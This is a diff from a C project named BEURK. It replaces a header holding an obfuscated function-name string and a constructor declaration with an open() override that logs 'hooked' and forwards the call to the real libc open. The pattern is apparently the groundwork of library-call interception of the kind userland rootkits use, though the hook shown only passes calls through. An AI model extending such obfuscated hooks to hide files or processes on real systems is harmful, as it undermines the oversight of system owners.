@@ -18,24 +18,34 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+/** 
+ *
+*/
 
-#include "config.h"
-#include "debug.h"
+#include <string.h>
+#define _GNU_SOURCE /* for RTLD_NEXT macro in dlfcn.h */
+#include <dlfcn.h>
 
-/* library constructor */
+/**
+ * includes open
+*/
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 
-# define LENGTH_SYSCALL	8
-# define SYSCALL_OPEN	"\x91\x8e\x9b\x90"
-# define NUM_SYSCALL	1
-# define SYS_OPEN		0
+#include <stdarg.h>
+#include "beurk.h"
 
-# define REAL_OPEN(args...) (beurk_syscalls_list[SYS_OPEN](args))
+int open(const char *pathname, int flag, ...) {
+	va_list	ap;
+	int		mode;
 
-static char		*beurk_syscalls_table[NUM_SYSCALL] = {
-	SYSCALL_OPEN
-};
-
-static void		*(*beurk_syscalls_list[NUM_SYSCALL])();
-
-static void     init(void) __attribute__((constructor));
+	DEBUG("call open(2) hooked\n");
+	va_start(ap, flag);
+	mode = va_arg(ap, int);
+	va_end(ap);
+	if (mode)
+		return (int)REAL_OPEN(pathname, flag, mode);
+	else
+		return (int)REAL_OPEN(pathname, flag);
+}
